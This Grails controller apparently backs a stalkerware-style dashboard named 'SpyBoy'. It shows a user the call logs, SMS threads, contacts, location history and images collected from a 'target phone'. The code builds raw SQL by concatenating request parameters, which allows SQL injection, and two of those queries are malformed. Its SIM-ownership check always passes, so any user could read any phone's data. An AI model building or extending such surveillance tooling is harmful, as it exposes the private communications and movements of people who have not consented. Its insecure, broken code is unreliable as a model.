package com.xaviar

import grails.converters.JSON

import org.apache.shiro.SecurityUtils

import com.xaviar.domain.CallLog
import com.xaviar.domain.Contact
import com.xaviar.domain.FileData
import com.xaviar.domain.Location
import com.xaviar.domain.Sms
import com.xaviar.domain.TargetPhone
import com.xaviar.domain.User

class SpyBoyController {

	def sessionFactory;
	def dataSource;

	def index() {
	}


	//call logs by number and target phone
	def callLog(){
		def callLogs=null;
		def colSortName='';
		def totalSize=0;

		TargetPhone currentTargetPhone = getTargetPhone(params);

		if(params.number!=null){
			switch(params.iSortCol_0){
				case "0":colSortName="phoneNumber";break;
				case "1":colSortName="type";break;
				case "2":colSortName="duration";break;
				case "3":colSortName="timeSeconds";break;
			}
			def callLogsCriteria = CallLog.createCriteria();
			callLogs = callLogsCriteria.list (cache: true,offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)) {
				and {
					eq("phoneNumber", params.number)
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
				order(colSortName, params.sSortDir_0)
			}

			def allCallLogsCriteria = CallLog.createCriteria();
			def allCallLogs = allCallLogsCriteria.list{
				and {
					eq("phoneNumber", params.number)
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
			}
			totalSize = allCallLogs!=null ? allCallLogs.size():0;
		}else{
			def callLogsCriteria = CallLog.createCriteria();
			callLogs = callLogsCriteria.list{
				and {
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
				order("timeSeconds","desc")
			}

			totalSize = callLogs!=null ? callLogs.size():0;
		}
		render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,callLogInstanceList:callLogs]}
	}


	def about(){
	}

	//all contacts by target phone
	def contacts(){

		TargetPhone currentTargetPhone = getTargetPhone(params);

		def contactsCriteria = Contact.createCriteria();
		def contacts = contactsCriteria.list{
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
			}
			order("name", "asc")
		}
		render(template:"contacts",model:[contactInstanceList: contacts, contactInstanceTotal: contacts!=null ? contacts.size():0]);
		return
	}


	//sms table and chat style by number and target phone
	def sms(){
		String number = params.number;
		def results = null;
		def contact =null;
		def owner = null;
		def isAll = false;
		def totalSize=0;
		def colSortName='';
		println params.contactId;
		TargetPhone currentTargetPhone = getTargetPhone(params);

		if(params.renderType!="table"){
			if(number!=null){
				def smsCriteria = Sms.createCriteria()
				results = smsCriteria.list{
					and {
						eq("address", params.number)
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
					order("time","asc")
				}

				def contactCriteria = Contact.createCriteria()
				contact = contactCriteria.list{
					and {
						eq("id",Long.parseLong(params.contactId))
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
				}
			}else{
				isAll = true;
				def session = sessionFactory.currentSession
				def query = session.createSQLQuery("select * from Sms t1 left join Contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t2.id="+params.contactId+" t2.targetPhoneId='"+ currentTargetPhone.simSubscriberId +"' group by t1.time order by t1.time asc");
				query.addEntity(com.xaviar.domain.Sms.class);
				query.addEntity(com.xaviar.domain.Contact.class); // this defines the result type of the query
				results=query.list();
			}
			render(template:"sms",model:[isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact.get(0),smsInstanceList: results, smsInstanceTotal: results!=null ? results.size():0]);
		}else{
			colSortName="time";
			switch(params.iSortCol_0){
				case "0":colSortName="folderName";break;
				case "1":colSortName="msg";break;
				case "2":colSortName="time";break;
			}
			if(number!=null){
				def smsCriteria = Sms.createCriteria();
				results = smsCriteria.list (offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)) {
					and {
						eq("address", params.number)
						like("msg","%" + params.sSearch + "%")
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
					order(colSortName, params.sSortDir_0)
				}

				def allSmsCriteria = Sms.createCriteria()
				def allSms = allSmsCriteria.list{
					and {
						eq("address", params.number)
						like('msg',"%" + params.sSearch + "%")
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
				}
				totalSize = allSms!=null ? allSms.size():0;

				def contactCriteria = Contact.createCriteria()
				contact = contactCriteria.list{
					and {
						eq("id",Long.parseLong(params.contactId))
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
				}
			}else{
				isAll = true;
				def session = sessionFactory.currentSession
				def query = session.createSQLQuery("select * from Sms t1 left join Contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t2.id="+params.contactId+" t2.targetPhoneId='"+ params.simSubscriberId +"' group by t1.time order by t1.time asc LIMIT " + params.iDisplayStart + ", "+ params.iDisplayLength);
				query.addEntity(com.xaviar.domain.Sms.class);// this defines the result type of the query
				query.addEntity(com.xaviar.domain.Contact.class); // this defines the result type of the query
				query.results=query.list();
			}
			render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact.get(0),smsInstanceList: results, smsInstanceTotal:totalSize]};
		}
		return
	}


	def icons(){
	}

	def location(){
		def colSortName='';

		TargetPhone currentTargetPhone = getTargetPhone(params);

		switch(params.iSortCol_0){
			case "0":colSortName="id";break;
			case "1":colSortName="address";break;
			case "2":colSortName="time";break;
		}

		def locationsCriteria = Location.createCriteria()
		def locations = locationsCriteria.list (cache: true,offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)) {
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
			}
			order(colSortName, params.sSortDir_0)
		}

		def allLocationsCriteria = Location.createCriteria()
		def allLocations = allLocationsCriteria.list {
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
			}
		}

		def totalSize = (allLocations!=null ? allLocations.size():0);
		render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,locationInstanceList:locations]}
	}

	private getTargetPhone(Map params) {
		String simSubscriberId = params.simSubscriberId;
		def username  = SecurityUtils.subject?.principal
		User user = User.findByUsername(username);

		def targetPhones = user.targetPhones;
		TargetPhone targetPhone = null;

		if(!validateSimID(simSubscriberId,targetPhones)){
			log.info "invalue target phone for this user."
			flash.message = "invalue target phone for this user.";
			return
		}else{
			targetPhone = TargetPhone.findBySimSubscriberId(simSubscriberId);

			return targetPhone;
		}
	}


	def getImageBytes() {
		println (params.picname);
		FileData pic = FileData.findByNameLike("%" + params.picname +"%",[cache: true]);
		if(pic!=null){
			response.getOutputStream().write(pic.decodedPic);
			response.getOutputStream().flush();
		}else{
			def baseFolder = grailsAttributes.getApplicationContext().getResource("/").getFile().toString()
			def imagesFolder = baseFolder + '/images/'
			println (imagesFolder);
			File file = new File(imagesFolder+"happy-clients-01.jpg");
			response.contentType = "image/jpeg";
			response.getOutputStream().write(file.bytes);
			response.outputStream.flush();
		}
	}


	def index_new(){
		String simSubscriberId = params.simSubscriberId;
		def scrollTo = null;
		def smss,callLogs,locations,contacts;

		def username  = SecurityUtils.subject?.principal
		User currentUser = User.findByUsername(username);

		//def targetPhones = user.targetPhones;

		def targetPhoneCriteria = TargetPhone.createCriteria()
		def targetPhones = targetPhoneCriteria.list{
			and {
				user{
					eq("username", currentUser.username)
				}
			}
			order("alias", "asc")
		}

		TargetPhone currentTargetPhone = null;
		
		if(targetPhones!=null){


			if(simSubscriberId!=null && !simSubscriberId.isEmpty()){
				if(!validateSimID(simSubscriberId,targetPhones)){
					log.info "invalue target phone for this user."
					flash.message = "invalue target phone for this user.";
					return
				}else{
					currentTargetPhone = TargetPhone.findBySimSubscriberId(simSubscriberId);
				}
			}else{
				currentTargetPhone = targetPhones.first();
				params.simSubscriberId = simSubscriberId = currentTargetPhone.simSubscriberId;
			}

			//contacts
			def contactCriteria = Contact.createCriteria()
			contacts = contactCriteria.list{
				and {
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
				order("name", "asc")
			}

			if(contacts!=null && contacts.size()>0){
				Contact defaultContact = contacts.get(0);
				String defaultNumber = defaultContact.number;

				//call logs
				def callLogCriteria = CallLog.createCriteria()
				callLogs = callLogCriteria.list(offset:0,max:5) {
					and {
						eq("phoneNumber", defaultNumber)
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
					order("timeSeconds","desc")
				}

				//smses
				def smsCriteria = Sms.createCriteria()
				smss = smsCriteria.list(offset:0,max:5) {
					and {
						eq("address", defaultNumber)
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
					order("time","desc")
				}

				// locations
				def locationCriteria = Location.createCriteria()
				locations = locationCriteria.list (offset:0,max:5) {
					and {
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
					order("time", "desc")
				}
			}
		}
		[currentTargetPhone:currentTargetPhone,activeSimSubscriberId:simSubscriberId,targetPhoneInstanceList:targetPhones,user:currentUser,scrollToID:scrollTo,contactInstanceList: contacts,contactInstanceTotal: contacts.size(),smsInstanceTotal: smss!=null ? smss.size():0,callLogsInstanceTotal: callLogs!=null ? callLogs.size():0,locationInstanceList:locations as JSON,locationInstanceTotal: locations!=null ? locations.size():0]
	}


	def validateSimID(String simSubscriberId,def targetPhones){
		return targetPhones.findAll{["simSubscriberId":simSubscriberId]};
	}

	def login(){
	}

	def profile(){
		def username  = SecurityUtils.subject?.principal
		User currentUser = User.findByUsername(username);
		[user:currentUser]
	}

	def layout_blank_page(){
		[contactInstanceList: Contact.list(sort:"name",order:"desc",cache: true)]
	}
}